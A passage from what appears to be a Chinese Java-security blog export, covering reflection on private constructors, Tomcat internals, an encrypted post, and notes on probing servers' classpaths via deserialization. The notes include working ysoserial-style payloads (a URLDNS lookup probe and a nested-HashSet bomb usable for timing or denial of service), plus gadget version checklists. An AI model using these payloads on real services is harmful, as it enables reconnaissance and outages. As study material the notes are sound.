class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.newInstance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A&#x27;s constructor is called.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">A</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a:&quot;</span> + a + <span class="string">&quot; b:&quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.newInstance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Class.NewInstance()调用私有构造函数:&quot;</span>);</span><br><span class="line">        b.newInstanceByClassNewInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Constructor.newInstance()调用私有构造函数:&quot;</span>);</span><br><span class="line">        b.newInstanceByConstructorNewInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*通过Class.NewInstance()创建新的类示例*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">newInstanceByClassNewInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">/*当前包名为reflect，必须使用全路径*/</span></span><br><span class="line">            A a=(A)Class.forName(<span class="string">&quot;reflect.newInstance.A&quot;</span>).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;通过Class.NewInstance()调用私有构造函数【失败】&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*通过Constructor.newInstance()创建新的类示例*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">newInstanceByConstructorNewInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">/*可以使用相对路径，同一个包中可以不用带包路径*/</span></span><br><span class="line">            Class c=Class.forName(<span class="string">&quot;reflect.newInstance.A&quot;</span>);</span><br><span class="line">            <span class="comment">/*以下调用无参的、私有构造函数*/</span></span><br><span class="line">            Constructor c0=c.getDeclaredConstructor();</span><br><span class="line">            c0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            A a0=(A)c0.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*以下调用带参的、私有构造函数*/</span></span><br><span class="line">            Constructor c1=c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">int</span>.class,<span class="type">int</span>.class&#125;);</span><br><span class="line">            c1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            A a1=(A)c1.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">5</span>, <span class="number">6</span>&#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>构造Java探测class反序列化gadget的思考</title>
      <link href="/2022/11/10/%E6%9E%84%E9%80%A0java%E6%8E%A2%E6%B5%8Bclass%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2022/11/10/%E6%9E%84%E9%80%A0java%E6%8E%A2%E6%B5%8Bclass%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="构造java探测class反序列化gadget的思考"><a href="#构造java探测class反序列化gadget的思考" class="headerlink" title="构造java探测class反序列化gadget的思考"></a>构造java探测class反序列化gadget的思考</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&amp;mid=2247484178&amp;idx=1&amp;sn=228ccc3d624f2d64a6c1d51555c42eea&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&amp;mpshare=1&amp;scene=23&amp;srcid=1231zSEsxQMxcrllvqoBgmcY&amp;sharer_sharetime=1640932147710&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">构造java探测class反序列化gadget</a></p><p>这篇文章是2021年最后一天读的，非常好。这让我对2022充满希望。谢谢师傅提供的好思路。</p><h2 id="urldns"><a href="#urldns" class="headerlink" title="urldns"></a>urldns</h2><p>通过urldns去判断是不是存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 生成我们需要的空类</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">makeClass</span><span class="params">(String clazzName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(clazzName);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">    ctClass.defrost();</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Authors(&#123; Authors.NOPOINT,Authors.C0NY1 &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmds = command.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmds.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;&lt;url&gt;|&lt;class name&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> cmds[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">clazzName</span> <span class="operator">=</span> cmds[<span class="number">1</span>];</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="comment">// 以URL对象为key，以探测Class为value</span></span><br><span class="line">        ht.put(u, makeClass(clazzName));<span class="comment">//</span></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果环境没有dns解析就不行咯</strong></p><h2 id="Dos"><a href="#Dos" class="headerlink" title="Dos"></a>Dos</h2><p><a href="https://blog.csdn.net/fnmsd/article/details/115672540">https://blog.csdn.net/fnmsd/article/details/115672540</a></p><p><a href="https://blog.csdn.net/nevermorewo/article/details/100100048">https://blog.csdn.net/nevermorewo/article/details/100100048</a></p><p><a href="https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java">https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java</a></p><p><strong>通过构造特殊的多层嵌套HashSet，导致服务器反序列化的时间复杂度提升，消耗服务器所有性能，导致拒绝服务。在这个基础上，我选择消耗部分性能达到间接延时的作用，来探测class。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Authors(&#123; Authors.C0NY1 &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByBomb</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> depth;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(command.contains(<span class="string">&quot;|&quot;</span>))&#123;</span><br><span class="line">            String[] x = command.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">            className = x[<span class="number">0</span>];</span><br><span class="line">            depth = Integer.valueOf(x[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            className = command;</span><br><span class="line">            depth = <span class="number">28</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">findClazz</span> <span class="operator">=</span> makeClass(className);</span><br><span class="line">        Set&lt;Object&gt; root = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        Set&lt;Object&gt; s1 = root;</span><br><span class="line">        Set&lt;Object&gt; s2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; depth; i++) &#123;</span><br><span class="line">            Set&lt;Object&gt; t1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            Set&lt;Object&gt; t2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            t1.add(findClazz);<span class="comment">//不存在类就抛出异常</span></span><br><span class="line">            s1.add(t1);</span><br><span class="line">            s1.add(t2);</span><br><span class="line">            s2.add(t1);</span><br><span class="line">            s2.add(t2);</span><br><span class="line">            s1 = t1;</span><br><span class="line">            s2 = t2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>经过师傅的实战一般这个深度都在25到28之间，切记不要设置太大否则造成DOS。</p><p>不过可以通过jep290继续防御</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djdk.serialFilter=maxarray=100000;maxdepth=20</span><br></pre></td></tr></table></figure><h2 id="class-checklist"><a href="#class-checklist" class="headerlink" title="class checklist"></a>class checklist</h2><p>要想在实战中使用，我们就需要事先去制作一份class的checklist备用。下面我通过diff maven中央仓库的统计的结果。最新的checklist和gadget都更新到ysoserial-for-woodpecker项目。</p><p><strong>6.1 CommonsCollections</strong></p><p>必须存在类：org.apache.commons.collections.functors.ChainedTransformer</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 3.1 or = 20040616</td><td style="text-align:center">org.apache.commons.collections.list.TreeList</td><td style="text-align:center">是</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">&gt;= 3.2.2</td><td style="text-align:center">org.apache.commons.collections.functors.FunctorUtils$1</td><td style="text-align:center">否</td><td style="text-align:center">无</td></tr></tbody></table></div><p><strong>6.2 CommonsCollections4</strong></p><p>必须存在类：org.apache.commons.collections4.comparators.TransformingComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 4.1</td><td style="text-align:center">否</td><td style="text-align:center">存在org.apache.commons.collections4.FluentIterable</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">4.0</td><td style="text-align:center">否</td><td style="text-align:center">不存在org.apache.commons.collections4.FluentIterable</td><td style="text-align:center">无</td></tr></tbody></table></div><p><strong>6.3 CommonsBeanutils</strong></p><p>必须存在类：org.apache.commons.beanutils.BeanComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 1.9.0</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.BeanIntrospector</td><td style="text-align:center">-2044202215314119608</td></tr><tr><td style="text-align:center">1.7.0 &lt;=  &lt;= 1.8.3</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.collections.Buffer</td><td style="text-align:center">-3490850999041592962</td></tr><tr><td style="text-align:center">&gt;= 1.6 or = 20030211.134440</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.ConstructorUtils</td><td style="text-align:center">2573799559215537819</td></tr><tr><td style="text-align:center">&gt;= 1.5 or 20021128.082114 &gt; 1.4.1</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.BeanComparator</td><td style="text-align:center">5123381023979609048</td></tr></tbody></table></div><p><strong>6.4 c3p0</strong></p><p>必须存在：org.apache.commons.beanutils.BeanComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">0.9.5-pre9 ～ 0.9.5.5</td><td style="text-align:center">是</td><td style="text-align:center">存在com.mchange.v2.c3p0.test.AlwaysFailDataSource</td><td style="text-align:center">-2440162180985815128</td></tr><tr><td style="text-align:center">0.9.2-pre2-RELEASE ~ 0.9.5-pre8</td><td style="text-align:center">是</td><td style="text-align:center">不存在com.mchange.v2.c3p0.test.AlwaysFailDataSource</td><td style="text-align:center">7387108436934414104</td></tr></tbody></table></div><p>以c3p0为例子，我们判断的步骤应该是</p><ol><li><p>第一步判断com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase是否存在，若存在C3P0可用</p></li><li><p>第二步判断com.mchange.v2.c3p0.test.AlwaysFailDataSource是否存在，存在说明是高版本，suid切换-2440162180985815128。否则切换7387108436934414104 </p></li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li><p>Oracle jdk or Open jdk</p></li><li><p>是jre还是jdk</p></li><li><p>中间件类型（辅助构造回显/内存马）</p></li><li><p>使用的web框架</p></li><li><p>BCEL classloader是否存在  <strong>com.sun.org.apache.bcel.internal.util.ClassLoader</strong></p></li><li><p>判断java版本是否低于&lt;7u104（该版本可以00截断）</p></li><li><p>……</p></li></ol><p>本来想继续去寻找的可是有点累了，以后有时间去弄吧。。。。。respect </p><p>参考</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&amp;mid=2247484178&amp;idx=1&amp;sn=228ccc3d624f2d64a6c1d51555c42eea&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&amp;mpshare=1&amp;scene=23&amp;srcid=1231zSEsxQMxcrllvqoBgmcY&amp;sharer_sharetime=1640932147710&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">构造java探测class反序列化gadget</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>typora写博客文章</title>
      <link href="/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/"/>
      <url>/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="46b3a3037e2545471f24cd4d293c7424e99ad2e707dc3584e5058edea324cd80">48e22157b1ef105701eba779d55791b94473791e743914b36adcaf48d5050f2b2005e371a10b73d013c4c54714aece0e090f85d79c253fd59744a0112d7cfb2d41133fd1f2d8fbf8f7e8a5e776633ddaa887781d2bfd0746955830bc917cef41cc1c6611eb13efacd4d27c163cf8f701eba37529e937a8a13158b20fc1dc533ba4e0ab12fa20e6c75590a99db6e335696b963f83c5ff58fbab454623381798850e745727e193712d84369bd15c6f4ba0b8996e5d6b68d8503d26bb7a07e5e7b4f4504648e5be960e7ea1135daaf1ec9550d56c78d0fd501feffdefcb8fe42132cb2cf9c4e169521c2fb5477aafdad9779793af924d516f1587f8f66d916ec80b0fa93eea0172cabf2d050564844d69cb365e8d6d0d396d74a3da05d1dbfebba9557d40a97d2fab1e34ad2bd055e58b5f30141e5c28a16821b356a3615ce9500ac0a66d0ff16c66a1e1131f207366a8a05c82a5ea4364852d79afb2d430ea07267ceeca22dbd6936d39de42945375fe066032fbd102f134ccf4657108101065d1aedfa7db3046042c8388f96b7311cd9cf230ac524b2e31d451f1464144e72ed05473666e87aaf06307af322aebcfb6376c04423d965cc884f29a69f8b4482d03189b8f492f72ef05679692de3bfc5bff9bdfd550dece246e6de6fed781ec98d09ee157adceac5d7ddc23e8371034b48cd8baf9a432a4e4ac9699ee012d43151807ccfbff70ee731f0d5b9f14f31aac6acd0c653fcd9eafb599fd3d387195169354aa8e9ed5d953a85c997b64f95f7398ef48bbd5c896e577dee8dd7b141a91fb95b6192d119a59bf2878fd72c7cf00b236fb33b783ed73d5722849606f8ca43388923b233366d6ca70a5d2061600f7f18fa9b2f12a6e0ca67c941dc338fe9aa662af49530b2c224a03cb37635b9213b1f25d69e0919300e2d547f665fd0a6e545ac01a704cb30f4727eeddc45d7b6543b43e891ba79f67684851c82efb4084f1111d4136065e5aba9b3c72401793f5fd155418e626511e68f134eff646867645ab7948dfddb3b5a9020b012da22dbbf0e4ee4f39966ee4064e5fbb2f119fb5d6543470cb4767325882f311cc0e62aaf1379efd1f459904dc50fb7daf7f5b4b659f85a4d2413cd40210cd026a62b03b2981e579019478e70ba48171de5db24687bf0f5f79740262ba42d663cfde6e10ba76c744a5915a851c8a6e612134fc07e80514b56551b8b3e2c5ba21362ff782594ff1735b66a84f87cb002208cff9766ca3d347d0ce5eb730691d620deab3040f0a1a10450f24e57aa9bd3dd1adf03ac5e67355daddcc3a90b91e998ab158d961d23f60127f845ac87c039e09e60b4375cabecb0a5d985d2921b4987b7cc0b4f547a2a92e773729e0c07c9499e05cb08eada1f031255c27608b09fcfb29d8f4c0905213116cbccbcdeba3e16c7fdcd237c9b83998b127071064780b853456f8e058952cab6b7237c98b2fbfd5fbf5daa2301ec54e6db2bffb1aaf37a05658f78b5d6e701b1891c09057110d09fde00dbf03ed27d46e130137d39ddd43e492abb5ea1dd6c97a23097ecb36022f048e8bc55053c8cee7808aa25d56b97d1d4f5eed0ab44b28152b171904fea1e591baafa60428cad1f83194d3da34ec7db7c859dd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深入学习tomcat</title>
      <link href="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/"/>
      <url>/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="深入学习tomcat"><a href="#深入学习tomcat" class="headerlink" title="深入学习tomcat"></a>深入学习tomcat</h1><h2 id="tomcat核心组件"><a href="#tomcat核心组件" class="headerlink" title="tomcat核心组件"></a>tomcat核心组件</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204195334994.png" alt="image-20220204195334994"></p><h2 id="核心组件的协助过程"><a href="#核心组件的协助过程" class="headerlink" title="核心组件的协助过程"></a>核心组件的协助过程</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204195638435.png" alt="image-20220204195638435"></p><h2 id="conf-server-xml"><a href="#conf-server-xml" class="headerlink" title="conf/server.xml"></a>conf/server.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Server</span> <span class="attr">port</span>=<span class="string">&quot;8005&quot;</span> <span class="attr">shutdown</span>=<span class="string">&quot;SHUTDOWN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Service</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    可以修改Catalina名字--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   连接器可以添加多个连接器就是端口和协议 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Engine</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span> <span class="attr">defaultHost</span>=<span class="string">&quot;localhost&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--      站点也可以添加多个 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span>  <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--修改默认的ROOT访问--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/demo&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;D://demo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Host</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Engine</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Server</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="tomcat请求流程"><a href="#tomcat请求流程" class="headerlink" title="tomcat请求流程"></a>tomcat请求流程</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204210315090.png" alt="image-20220204210315090"></p><h3 id="Pipeline结构"><a href="#Pipeline结构" class="headerlink" title="Pipeline结构"></a>Pipeline结构</h3><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204210545634.png" alt="image-20220204210545634"></p><p>每次在配置中添加value是在默认的pipeline的前面。</p><p>也就是tomcat的每一个组件之间的相互调用是通过pipeline去实现的</p>]]></content>
      
      
      <categories>
          
          <category> 学习tomcat </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解决agent中tools加载的问题</title>
      <link href="/2022/11/10/%E8%A7%A3%E5%86%B3agent%E4%B8%ADtools%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/11/10/%E8%A7%A3%E5%86%B3agent%E4%B8%ADtools%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
